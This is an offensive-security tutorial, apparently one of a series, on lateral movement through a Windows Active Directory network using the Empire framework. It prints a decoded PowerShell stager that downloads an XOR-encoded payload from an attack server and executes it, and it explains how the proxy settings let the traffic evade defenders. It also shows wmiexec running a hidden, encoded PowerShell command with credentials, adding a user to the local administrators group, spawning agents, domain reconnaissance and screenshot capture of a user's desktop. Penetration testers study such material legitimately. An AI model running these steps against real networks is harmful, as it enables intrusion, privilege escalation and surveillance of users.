# Lateral movement with Empire

In our previous cookbook on Active Directory, we demonstrated how to use Responder and wmiexec.py to obtain initial credentials using a compromised account. This would eventually allow us to escalate our privileges, communicate with domain controllers and efficiently move laterally through the network. The methods described here are based on the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real-Life Scenarios" (specifically, starting from page 54). My goal is to reiterate and explain some of these techniques in greater detail.

Our next stage involves using a PowerShell framework called Empire. Empire is a collection of scripts that automates reconnaissance and escalation processes. The plan is to execute an Empire script on the compromised computer using wmiexec. This script will connect back to the attack server, giving us interactive access to a collection of modules that we can execute on the compromised computer.

On the welcome screen of Responder, navigate to the listeners’ menu (Command Listeners). To view the details of the default listener, use the info command. This command provides information about the currently configured listener.

Here are some additional common commands you might find useful:

    help: Displays a list of available commands and their descriptions.
    list: Lists all available listeners or modules.
    use <Listener_name>: Switches to a specific listener or module.
    set <Option> <Value>: Configures options for the selected listener or module (e.g., set Port 443).
    run <Listener_name>: Starts the specified listener.

To set up the listener with the correct port and address, use the set command. For example, set Port 443 configures the listener to use port 443. Finally, execute the listener using the run <Listener_name> command, replacing <Listener_name> with the name of your listener.

To generate the PowerShell code that will connect back to the listener, we need to create what is referred to as a 'stager' or 'agent'. Follow these steps in Empire:

```
(Empire) > usestager launcher
```

Configure the listener:

```
(Empire) > Set Listener AttackSrv_List
```

Specify the output file:

```
(Empire) > Set OutFile /root/stager_ps.ps1
```

This will generate the PowerShell script and save it as stager_ps.ps1 in the /root/ directory.

When we inspect the stager_ps.ps1 file, we will see what appears to be a string of seemingly random characters. These characters are actually obfuscated commands encoded in base64. Base64 encoding is used here to simplify the inline execution of the script by encoding the command in a format that is less likely to be flagged or altered by security tools. This encoding converts binary data into ASCII characters, making it easier to transmit and execute within various environments.

On a side note, we can reverse base64 encoding with the following command:

```
root@AttackServer:# echo "WwBTAFkAUwB0AGUAbQAuI[...]" | base64 -d
```

This command will decode the base64-encoded string, revealing the original PowerShell commands as described below:

```
# Disable Expect 100 Continue behavior
[System.Net.ServicePointManager]::Expect100Continue = $false

# Create a new WebClient object
$webClient = New-Object System.Net.WebClient

# Set the User-Agent header
$userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$webClient.Headers.Add('User-Agent', $userAgent)

# Use the default system proxy settings
$webClient.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# XOR key for decoding
$key = '7c37be7260f8cd7c1f5e4dbdd7bc5b23'
$index = 0

# Download and decode the script
$encodedScript = $webClient.DownloadString("http://192.168.56.101:443/index.asp")
$decodedScript = [char[]]$encodedScript | ForEach-Object {
    $_ -bxor [char[]]$key[$index++ % $key.Length]
}

# Execute the decoded script
Invoke-Expression ($decodedScript -join '')
```

Quick breakdown:

```
[System.Net.ServicePointManager]::Expect100Continue = $false
```

This setting disables the default behavior of the WebClient object that sends an HTTP 100-Continue response, which is typically used to determine if the server is willing to accept the request.

The HTTP 100-Continue response is part of the HTTP/1.1 protocol. It is used as a handshake mechanism between a client and server. When a client sends a request with a Expect: 100-Continue header, the server responds with a 100 Continue status if it is prepared to accept the request. This allows the client to send the request body only after receiving this preliminary approval, thereby saving bandwidth if the server is not willing to accept the request.

Setting Expect100Continue to $false disables this behavior. This means the WebClient object will not wait for a 100 Continue response before sending the request body. This can be useful in certain scenarios where the overhead of waiting for this response is not desired, or in cases where you are making a series of requests that do not need this handshake.


```
$webClient = New-Object System.Net.WebClient
```

This creates a WebClient object, which is used to download data from the web.

```
$userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$webClient.Headers.Add('User-Agent', $userAgent)
```

This sets the User-Agent header to mimic a browser request.

```
$webClient.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
```

Configures the WebClient to use the system's default proxy settings and credentials. Many networks use a proxy server to control and monitor traffic between the internal network and the internet. By configuring the WebClient to use the default system proxy, we ensure that network requests adhere to the organization’s network policies. Also, some proxies require authentication. Configuring the WebClient with system credentials allows it to authenticate with the proxy server, ensuring successful communication.

Using system settings helps the WebClient blend in with standard network behavior, making the traffic less suspicious and reducing the risk of detection. Adhering to system-wide proxy settings ensures that your requests look like normal traffic, making it harder for network defenders to distinguish your actions from legitimate user activity.



```
$key = '7c37be7260f8cd7c1f5e4dbdd7bc5b23'
$index = 0
```

Sets up the key for XOR decryption.

XOR (exclusive OR - "true when either but not both inputs are true") is a bitwise operation used for simple encryption and decryption. It is a fundamental operation in many cryptographic algorithms. The XOR operation is defined as follows:

If the bits are the same, the result is 0.

If the bits are different, the result is 1.

Each byte of the encoded data is XORed with a byte from the key. The result is a seemingly random string of characters. To decode the data, the same XOR operation is performed again with the same key. This is because XORing a value twice with the same key returns the original value.

Here’s a more detailed breakdown of the process:

- Original Data (D): This is the byte or piece of data you want to encrypt. For simplicity, let's say D is a byte with a value of 01010101 in binary.

- Key (K): This is a byte or series of bytes used to perform the XOR operation. Assume the key K is 00110011.

The encryption operation uses XOR to combine the original data with the key. For each bit in the data byte, XOR it with the corresponding bit in the key byte. For instance, E = D XOR K, where E is the encrypted output.

In binary, it looks like this:

```
D: 01010101
K: 00110011
---------------
E: 01100110
```

To reverse the process, XOR the encrypted data with the same key. Since XOR is its own inverse, performing D = E XOR K will return the original data D.

So, applying the XOR operation again:

```
E: 01100110
K: 00110011
---------------
D: 01010101
```

Hopefully this explains the gist of it in a clear way. And now the last parts of our code:

```
$encodedScript = $webClient.DownloadString("http://192.168.56.101:443/index.asp")
$decodedScript = [char[]]$encodedScript | ForEach-Object {
    $_ -bxor [char[]]$key[$index++ % $key.Length]
}
```

This downloads the encoded script from the specified URL and decodes the script using XOR decryption with the provided key.

```
Invoke-Expression ($decodedScript -join '')
```

Executes the decoded PowerShell script using Invoke-Expression.

To execute the stager on the compromised workstation, use wmiexec to run the PowerShell script. After running the command, we'll wait for a notification on the attack server:

```
root@backdoor:# wmiexec.py wk_admin:7stringsRockHell*@192.168.1.25
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
[*] SMBv3.0 dialect used
C:\>powershell.exe -NoP -sta -NonI -W Hidden -Enc
WwBTAFkAUwB0AGUAbQAuAE4AZQBUA[...]
```

The above command initiates the stager script, which connects back to our listener:

```
(Empire: stager/launcher) >
[+] Initial agent HRWTGSWH1H4TGHEK from 192.168.1.25 now active
```

At this point, we are connected to the workstation as wk_admin. Although this user is not part of the domain, they have administrative privileges on the workstation. Rename the agent to wk_agent for easier management:

```
(Empire) > interact HRWTGSWH1H4TGHEK
(Empire: HRWTGSWH1H4TGHEK) > rename wkAgent
(Empire: wkAgent) >
```

Next, verify that the initially compromised account (user) is not listed as a local administrator. Add the compromised user to the local administrators group:

```
(Empire: wkAgent) > shell net localgroup administrators
(Empire: wkAgent) > shell net localgroup administrators /add username
The command completed successfully.
```

The wk_admin agent remains active for performing various actions on the workstation, such as listing folders or retrieving files. However, its scope is limited to this single workstation.

To communicate with the Windows Active Directory Domain and deepen network infiltration, we need an agent with valid domain credentials. Spawn a new agent using the elevated user’s credentials to gain broader access:

```
(Empire: wk_agent) > usemodule management/spawnas
(Empire: spawnas) > set UserName user
(Empire: spawnas) > set Password Password123
(Empire: spawnas) > set Domain SHOP
(Empire: spawnas) > set Listener AttackSrv_List
(Empire: spawnas) > set Agent wkAgent
(Empire: spawnas) > run
```

With the user’s agent, use the get_domain_controller module to identify the domain controllers within the SHOP domain:

```
(Empire: UsrAgent) > usemodule situational_awareness/network/powerview/get_domain_controller
(Empire: get_domain_controller) > execute
```

The output will show two domain controllers: SV0198 and SV0199.

To further explore the network, use the get_domain_trust module to map out trust relationships between domains:

```
(Empire: UsrAgent) > usemodule situational_awareness/network/powerview/get_domain_trust
(Empire: get_domain_trust) > run
```

A trust relationship allows one domain to trust and permit users from another domain to connect to its resources. The output will indicate the type of trust and its direction. For instance, a "Bidirectional" trust means that trust is mutual, while an "External" trust signifies that domains are part of separate forests. If we compromise the SHOP domain, we'll need to separately target each forest for access to other domains.

Note on Trust Types:

- External Trust: Domains are in separate forests with no inherent links.

- TreeRoot or ChildRoot Trust: Domains are in the same forest. Compromising one domain can compromise all domains within that forest.

We start by searching for files and documents on the compromised workstation but find no relevant data such as sales records or passwords. For example, we list the contents of the Documents directory:

```
(Empire: UsrAgent) > shell dir c:\users\User\Documents
```

To gain insights into the user's current activities, we capture a screenshot of the desktop. This can provide visual context for what the user is doing, which might help in locating critical information or understanding the user’s actions:

```
(Empire: UsrAgent) > usemodule collection/screenshot
(Empire: screenshot) > run
```

After running the screenshot module, the screenshot is typically saved on the attack server where Empire is running. To view or download the screenshot look in the directory where Empire stores its output files. This is usually a directory specified in Empire’s configuration or by default settings. Sometimes, Empire will provide a direct download link or view option in the console after the module has executed. If Empire saves files to a directory on the attack server, you can navigate to that directory and retrieve the screenshot file directly.

To conclude all this, the hypothetical screenshot reveals that the user is interacting with a web application. By launching Firefox through the SOCKS proxy we set up earlier (see the cookbook named "ssh tunneling"), we can visit the same URL. This allows us to identify that the platform in use is Citrix. More details on working with Citrix platforms will be covered in the next cookbook.
